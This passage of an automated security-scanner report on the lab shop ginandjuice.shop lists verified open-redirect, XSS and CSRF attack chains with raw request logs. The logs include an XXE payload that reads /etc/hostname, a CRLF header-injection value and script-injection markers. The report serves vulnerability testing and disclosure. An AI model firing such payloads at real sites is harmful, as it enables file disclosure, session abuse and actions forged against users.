  A state-changing request from a hostile origin was accepted exactly like a same-origin one (fresh-origin replay) — silent cross-site action forgery against authenticated users.

  - `finding` ref `F-d8bbff4e3e` excerpt: `impact grade=proven; chain: re-test:fresh-hostile-origin on POST https://ginandjuice.shop/catalog/cart`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

</details>


### AP-cae13ab2cf — VERIFIED — open_redirect at /blog/ — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request |
| **entry** | verified | GET https://ginandjuice.shop/blog/ — parameter search |
| **action** | verified | an off-site URL injected into a redirect sink |
| **object** | verified | the client redirect sink |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Unvalidated redirect to an attacker-controlled destination (fresh target replay) — phishing/trust laundering. |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request

  - `journal` ref `req-25669f7f` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:24 GMT
      content-type: text/html; charset=utf-8
      content-length: 8681
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    
  - `finding` ref `F-ef23b8b42b` excerpt: `off-site URL injected into client redirect sink`
    finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
      evidence[body_redirect]: off-site URL injected into client redirect sink
      evidence[body_redirect]: off-site URL injected into client redirect sink
      verification: re-test:second-host passed=True conf=0.85 rounds=1

**[ENTRY] — verified**

  GET https://ginandjuice.shop/blog/ — parameter search

  - `finding` ref `F-ef23b8b42b` excerpt: `off-site URL injected into client redirect sink`
    finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
      evidence[body_redirect]: off-site URL injected into client redirect sink
      evidence[body_redirect]: off-site URL injected into client redirect sink
      verification: re-test:second-host passed=True conf=0.85 rounds=1
  - `journal` ref `req-00501ac7` excerpt: `https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:12 GMT
      content-type: text/html; charset=utf-8
      content-length: 8689
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    

**[ACTION] — verified**

  an off-site URL injected into a redirect sink

  - `finding` ref `F-ef23b8b42b` excerpt: `verification: re-test:second-host (passed=True)`
    finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
      evidence[body_redirect]: off-site URL injected into client redirect sink
      evidence[body_redirect]: off-site URL injected into client redirect sink
      verification: re-test:second-host passed=True conf=0.85 rounds=1
  - `journal` ref `req-00501ac7` excerpt: `https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:12 GMT
      content-type: text/html; charset=utf-8
      content-length: 8689
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    

**[OBJECT] — verified**

  the client redirect sink

  - `finding` ref `F-ef23b8b42b` excerpt: `off-site URL injected into client redirect sink`
    finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
      evidence[body_redirect]: off-site URL injected into client redirect sink
      evidence[body_redirect]: off-site URL injected into client redirect sink
      verification: re-test:second-host passed=True conf=0.85 rounds=1

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-00501ac7` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:12 GMT
      content-type: text/html; charset=utf-8
      content-length: 8689
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    
  - `finding` ref `F-ef23b8b42b` excerpt: `off-site URL injected into client redirect sink`
    finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
      evidence[body_redirect]: off-site URL injected into client redirect sink
      evidence[body_redirect]: off-site URL injected into client redirect sink
      verification: re-test:second-host passed=True conf=0.85 rounds=1

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-ef23b8b42b` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
      evidence[body_redirect]: off-site URL injected into client redirect sink
      evidence[body_redirect]: off-site URL injected into client redirect sink
      verification: re-test:second-host passed=True conf=0.85 rounds=1

**[IMPACT] — verified**

  Unvalidated redirect to an attacker-controlled destination (fresh target replay) — phishing/trust laundering.

  - `finding` ref `F-ef23b8b42b` excerpt: `impact grade=proven; chain: re-test:second-host on GET https://ginandjuice.shop/blog/`
    finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
      evidence[body_redirect]: off-site URL injected into client redirect sink
      evidence[body_redirect]: off-site URL injected into client redirect sink
      verification: re-test:second-host passed=True conf=0.85 rounds=1

</details>


### APC-3f76a0baa0 — VERIFIED — xss_dom -> tokenless cross-site state change (chain: F-fc86abef99 + F-d8bbff4e3e)
*Every link below carries verified evidence. The path is fully proven.*

findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

**HOP 1** [VERIFIED] (finding F-fc86abef99) — attacker-delivered script executes in the victim's browser on ginandjuice.shop (xss_dom: execution proven)
  - evidence: finding `F-fc86abef99` — `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS_`
  - evidence: journal `req-25669f7f` — `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`

**HOP 2** [VERIFIED] (finding F-d8bbff4e3e) — the executing code drives the state-changing operation POST https://ginandjuice.shop/catalog/cart — which accepts tokenless cross-origin requests
  - evidence: finding `F-d8bbff4e3e` — `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), `
  - evidence: journal `req-0064df16` — `https://ginandjuice.shop/catalog/cart`

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | attacker-delivered script running in a victim's browser; the state change rides the victim's session (the operation was proven to accept tokenless hostile-origin requests with a valid session cookie) |
| **entry** | verified | GET https://ginandjuice.shop/blog/ — parameter search |
| **action** | verified | inject script via xss_dom (/blog/, param search) -> executing code forges the tokenless state change at /catalog/cart |
| **object** | verified | the state-changing operation (twin entity typing: Order) |
| **authorization** | verified | the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation) |
| **state** | verified | the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline) |
| **impact** | verified | client-side code execution combined with an unprotected state change: arbitrary actions performable in the victim's session |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  attacker-delivered script running in a victim's browser; the state change rides the victim's session (the operation was proven to accept tokenless hostile-origin requests with a valid session cookie)

  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

**[ENTRY] — verified**

  GET https://ginandjuice.shop/blog/ — parameter search

  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:24 GMT
      content-type: text/html; charset=utf-8
      content-length: 8681
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    

**[ACTION] — verified**

  inject script via xss_dom (/blog/, param search) -> executing code forges the tokenless state change at /catalog/cart

  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:24 GMT
      content-type: text/html; charset=utf-8
      content-length: 8681
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    
  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `journal` ref `req-0064df16` excerpt: `https://ginandjuice.shop/catalog/cart`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
    RESPONSE 400
      date: Sat, 03 Oct 2026 22:26:30 GMT
      content-type: application/json; charset=utf-8
      content-length: 31
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Missing parameter 'productId'"

**[OBJECT] — verified**

  the state-changing operation (twin entity typing: Order)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/`
    twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/

**[AUTHORIZATION] — verified**

  the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

**[STATE] — verified**

  the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `journal` ref `req-0064df16` excerpt: `"Missing parameter 'productId'"`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
    RESPONSE 400
      date: Sat, 03 Oct 2026 22:26:30 GMT
      content-type: application/json; charset=utf-8
      content-length: 31
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Missing parameter 'productId'"

**[IMPACT] — verified**

  client-side code execution combined with an unprotected state change: arbitrary actions performable in the victim's session

  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

</details>


### APC-546f2090a6 — VERIFIED — xss_reflected -> tokenless cross-site state change (chain: F-4df129b258 + F-d8bbff4e3e)
*Every link below carries verified evidence. The path is fully proven.*

findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

**HOP 1** [VERIFIED] (finding F-4df129b258) — attacker-delivered script executes in the victim's browser on ginandjuice.shop (xss_reflected: execution proven)
  - evidence: finding `F-4df129b258` — `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmark`
  - evidence: journal `req-00eb0dfb` — `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`

**HOP 2** [VERIFIED] (finding F-d8bbff4e3e) — the executing code drives the state-changing operation POST https://ginandjuice.shop/catalog/cart — which accepts tokenless cross-origin requests
  - evidence: finding `F-d8bbff4e3e` — `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), `
  - evidence: journal `req-0064df16` — `https://ginandjuice.shop/catalog/cart`

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | attacker-delivered script running in a victim's browser; the state change rides the victim's session (the operation was proven to accept tokenless hostile-origin requests with a valid session cookie) |
| **entry** | verified | GET https://ginandjuice.shop/catalog — parameter category |
| **action** | verified | inject script via xss_reflected (/catalog, param category) -> executing code forges the tokenless state change at /catalog/cart |
| **object** | verified | the state-changing operation (twin entity typing: Order) |
| **authorization** | verified | the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation) |
| **state** | verified | the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline) |
| **impact** | verified | client-side code execution combined with an unprotected state change: arbitrary actions performable in the victim's session |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  attacker-delivered script running in a victim's browser; the state change rides the victim's session (the operation was proven to accept tokenless hostile-origin requests with a valid session cookie)

  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

**[ENTRY] — verified**

  GET https://ginandjuice.shop/catalog — parameter category

  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>

**[ACTION] — verified**

  inject script via xss_reflected (/catalog, param category) -> executing code forges the tokenless state change at /catalog/cart

  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `journal` ref `req-0064df16` excerpt: `https://ginandjuice.shop/catalog/cart`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
    RESPONSE 400
      date: Sat, 03 Oct 2026 22:26:30 GMT
      content-type: application/json; charset=utf-8
      content-length: 31
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Missing parameter 'productId'"

**[OBJECT] — verified**

  the state-changing operation (twin entity typing: Order)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/`
    twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/

**[AUTHORIZATION] — verified**

  the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

**[STATE] — verified**

  the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline)

  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
  - `journal` ref `req-0064df16` excerpt: `"Missing parameter 'productId'"`
    REQUEST  POST https://ginandjuice.shop/catalog/cart
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/xml
      Cookie: AWSALB=[REDACTED]
      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
